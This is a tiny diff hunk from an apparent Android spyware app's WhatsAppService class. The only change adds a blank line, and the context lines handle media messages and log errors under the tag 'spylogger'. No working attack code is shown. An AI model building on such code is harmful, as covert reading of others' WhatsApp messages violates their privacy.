@@ -299,6 +299,7 @@ public class WhatsAppService extends Service {
             if (!mensagensComMidia.isEmpty() && mensagensComMidia.size()<10) {
                 verificaArquivos(mensagensComMidia,1);
             }
+
         } catch (SQLException e) {
             Log.e("spylogger", e.getMessage());
         } finally {
